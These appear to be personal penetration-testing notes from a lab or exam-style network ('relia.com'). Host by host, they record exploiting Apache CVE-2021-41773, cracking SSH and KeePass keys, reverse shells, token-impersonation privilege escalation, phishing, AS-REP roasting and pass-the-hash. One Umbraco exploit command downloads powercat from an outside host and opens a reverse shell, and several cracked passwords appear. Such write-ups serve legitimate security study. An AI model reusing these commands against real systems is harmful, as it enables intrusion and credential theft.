### 192.168.243.245

anonymous ftp available, but no contents
apache cve2021-41773 working
tried to get id_rsa of users but no luck
got id_ecdsa of anita
cracked using john
passphrase fireball 
got the shell
found local.txt
privsec using exploit_nss.py
found proof.txt

### 192.168.224.246

loggedin with anita private key
found local.txt
using ss found listening on localhost:8000
ssh -L 9090:localhost:8000 -i id_ecdsa anita@192.168.209.246 -p 2222 did ssh tunneling
accessed internal website using 127.0.0.1:9090
found backend with view parameter
searched for writeable directories
found /dev/shm
uploaded php reverse shell
got reverse connection
sudo -l showing nopasswd all
sudo su
got proof.txt

### 192.168.209.247

ftp server running on 14020
web server running on 14080
find direct exploit for umbraco 
python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i 'http://web02.relia.com:14080' -c powershell.exe -a "-NoProfile -Command IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.212:8000/powercat.ps1'); powercat -c 192.168.45.212 -p 443 -e powershell"
local.txt not found
seimpersonate privilege available
printspoofer not working
godpotato worked
proof.txt found

### 192.168.243.248

smb server running
accessed smb using smbclient //192.168.244.248/ -U guest
found database.kdbx file
converted to keepass2john Database.kdbx > keepasshash.txt
cracked password using john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash.txt
found emma password in keepass
logge in rdp with emma
found local.txt
found a exe in C: for dll hijacking but rabbithole
ran Get-Childitem -path env:
 appkey !8@aBRBYdb3!
 open admin cmd with mark and above password
 got proof.txt

### 192.168.244.249
gobuster on port 80 and 8000
nothing on port 80 except aspnet_client/system_web
on port 8000 rite cms
found /cms/admin.php with default credentials
uploaded php reverse shell from revshells.com
got reverse shell
found local.txt
seimpersonate privilege available
used godpotato
found proof.txt
unable to run mimikatz
added a new user to administrator and rdp group
got rdp with new user
from git head found email id and password and a additional email id


###  192.168.196.189

crackmapexec smb 192.168.196.189 -u user.txt -p pass.txt --continue-on-success 
found maildmz as valid user with password
detailed steps for windows library abuse using phishing mail in assembling the pieces

```
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
```

sent phishing mail to jim@relia.com
got reverse shell from 172.16.86.14
found local.txt

### 172.16.86.14

got reverse shell after sending email using 189
found local.txt
found Database.kdbx
transferred to kali using
impacket-smbserver -smb2support test .
copy scheduler.exe \\192.168.45.173\test\scheduler.exe
found password of jim@relia.com and dmzadmin
also permissions to access c:\users\offsec
found proof.txt on desktop
got stuck now, no share access available, no evilwinrm, no password spraying working

turned to asreproasting using rubeus, found michelle user hash, cracked using hashcat
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


### 192.168.196.191
logged into rdp with dmzadmin
got adminitstrator access
found proof.txt
connected to internal network using ligolo


### 172.16.86.7 

logged in with michelle user
found local.txt
found scheduler.exe in C:
running as a administrator service
use customlib.dll but no permission to replace exe or dll
use one more beyondhelper.dll. created and copied in same directory
created new user and cmd as .\dave2
found proof.txt
ran mimikatz found plain text password of andrea

### 172.16.99.15

logged in with andrea user, found local.txt
update collector folder in C:\
schedule.ps1 in C:\ with misspelled updatecollctor.exe
scheduled to runas milana
created msfvenom shell and saved as uploadcollctor
got reverse shell found proof.txt
have impersonate and debug privilege
found hash of milana
in documents found databse.kdbx
in db found ssh key of sarah
tried on 19

### 172.16.99.19

logged in with ssh key of sarah
found local.txt
sudo -l borg command 
used extract to stdout with borg
found password of linux 20 and hash of amy
su amy
sudo su
found proof.txt

### 172.16.92.20

ssh using andrew password found on 19
found local.txt
 ssh -L 80:127.0.0.1:80 andrew@172.16.132.20

started apache service using service apache24 onestatus
got reverse shell as www user
can read history file of mount user
found password of mountuser from history, was used on 21

### 172.16.92.21

accessed 21 share from 191 using mountuser credentials, found password of administrator
enter-pssession for 21 from 191
all other machine using ps session with dom admin

### 192.168.250.189

converted relia.com/administrator password to ntlm and used impacket-psexec









